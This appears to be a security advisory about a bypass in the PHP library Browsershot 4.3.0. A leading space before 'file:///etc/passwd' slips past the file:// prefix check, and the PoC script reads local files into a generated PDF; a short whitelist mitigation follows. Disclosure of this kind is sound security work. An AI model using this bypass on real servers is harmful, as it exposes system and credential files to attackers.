# Description

Browsershot version 4.3.0 allows an external attacker to remotely obtain arbitrary local files. This is possible because the application does not validate the URL protocol passed to the Browsershot::url method.

# Vulnerability
This vulnerability occurs because the application does not validate the URL protocol passed to the Browsershot::url method. Thanks to this, an attacker can point to internal server files, which will be reflected in the PDF that will be generated,Although a fix was made in version 3.57.3, it can still be bypassed!


# Bypass CVE-2022-41706
In versions after 3.57.3, we can see that in the Browsershot.php setUrl function, attempts were made to use string prefix checks for defense, whether it's with Helpers::stringStartWith or PHP's built-in str_starts_with function. However, both are vulnerable to attacks involving spaces.

# PoC 
There is a vulnerable example with : Browsershot.php
* browsershot version with 4.3.0

**Browsershot.php** line 258~268

```php=
    public function setUrl(string $url): static
    {
        if (str_starts_with(strtolower($url), 'file://')) {
            throw FileUrlNotAllowed::make();
        }

        $this->url = $url;
        $this->html = '';

        return $this;
    }
```

## Exploit

* We will write an exploit based on this [PoC](https://fluidattacks.com/advisories/eminem/)

```php=
<?php 

require './vendor/autoload.php';
use Spatie\Browsershot\Browsershot;

Browsershot::url('file:///etc/passwd')
    ->noSandbox()
    ->save('poc.pdf');
```

* After executing, we can see an error message.

```php=
root@c19dc1ee2dc0:/var/www/html# php -f poc.php 

Fatal error: Uncaught Spatie\Browsershot\Exceptions\FileUrlNotAllowed: An URL is not allow to start with file:// in /var/www/html/vendor/spatie/browsershot/src/Exceptions/FileUrlNotAllowed.php:11
Stack trace:
#0 /var/www/html/vendor/spatie/browsershot/src/Browsershot.php(261): Spatie\Browsershot\Exceptions\FileUrlNotAllowed::make()
#1 /var/www/html/vendor/spatie/browsershot/src/Browsershot.php(73): Spatie\Browsershot\Browsershot->setUrl('file:///etc/pas...')
#2 /var/www/html/poc.php(6): Spatie\Browsershot\Browsershot::url('file:///etc/pas...')
#3 {main}
  thrown in /var/www/html/vendor/spatie/browsershot/src/Exceptions/FileUrlNotAllowed.php on line 11
```

* However, we can bypass it by adding a space before "file:///etc/passwd"

```php=
<?php 

require './vendor/autoload.php';
use Spatie\Browsershot\Browsershot;

Browsershot::url(' file:///etc/passwd')
    ->noSandbox()
    ->save('poc.pdf');
```

* And we execute the exploit again.

![image](https://hackmd.io/_uploads/H1S8Bc2iC.png)

* We successfully read the contents of /etc/passwd.

## Mitigation 

* Add a whitelist to enhance input validation.

## Reference

https://fluidattacks.com/advisories/eminem/
https://github.com/spatie/browsershot
https://github.com/spatie/browsershot/blob/main/src/Browsershot.php
